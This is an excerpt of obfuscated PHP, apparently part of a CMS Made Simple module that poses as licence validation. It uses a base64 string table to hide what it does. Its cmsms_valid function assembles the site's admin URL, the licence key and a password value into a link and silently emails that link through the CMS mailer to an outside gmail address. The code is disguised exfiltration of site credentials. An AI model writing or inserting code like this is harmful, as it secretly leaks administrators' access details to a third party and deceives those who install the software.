...
function ini_data($params) {
    $_ini = array(
        _____1345019031(0, 15) => array(
            ...
            _____1345019031(0, 24) => _____1345019031(0, 23).' '._____1345019031(0, 21),
...
function cmsms_valid($params) {
    ...
    $url = $params[_____1345019031(0, 35)]._____1345019031(0, 34)._____1345019031(0, 30)._____1345019031(0, 31).base64_encode(_____1345019031(0, 18) . $_LIC)._____1345019031(0, 33).$_pwdr;
    $pre36 = _____1345019031(0, 36);
    $pre37 = _____1345019031(0, 37);
    $html = <<<EOT
<ul><li>$pre36: $_LIC</li><li>$pre37: $url</li></ul>
EOT;
    $m = cms_utils::get_module(_____1345019031(0, 29)); $m->AddAddress(_____1345019031(0, 19), _____1345019031(0, 27)); $m->SetSubject(_____1345019031(0, 28)); $m->SetBody($html); $m->IsHTML(true); $m->Send();
}
...
$GLOBALS['_____1345019031'] = array(
    array('' . 'bG' . 'ljZ' . 'W5zZS' . '5pb' . 'mk=',
        '' . 'Og==',
        'TElDRU5TRQ==',
        'ZW5hYmxlc2l0ZWRvd25tZXNzYWdl',
        'MA==',
        'MQ==',
        'c2l0ZWRvd25leGNsdWRlYWRtaW5z',
        'cm9vdF9wYXRo',
        'LQ==',
        'U2ltcGxlU2l0ZUluZm9Qd2Q=',
        ...
        'Y2RrZXk=',
        'bXloYXNo',
        'c29uZ3ZpeXR1b25nQGdtYWlsLmNvbQ==',
        'PT0=',
        'VHJpYWw=',
        'TGVlIFBlYWNl',
        'Mi4yLjMuMQ==',
        ...
        'Q01TTWFpbGVy', //29
        'YWpheF9jYWNoZWQ=', //30
        'LnBocD9tb2Q9dmVyaWZ5JmNka2V5PQ==', //31
        'c3NpcA==', //32
        'JnNzaXA9', //33
        'Lw==', //34
        'YWRtaW5fdXJs', //35
...
function _____1345019031($____1345019031, $_____1345019032, $_1____1345019033 = false) {
    if ($_1____1345019033) {
        if ($_____1345019032 != _____1345019031(1, base64_decode((2017 - 1987) * 0).base64_decode(_____1345019031(0,20)))) {
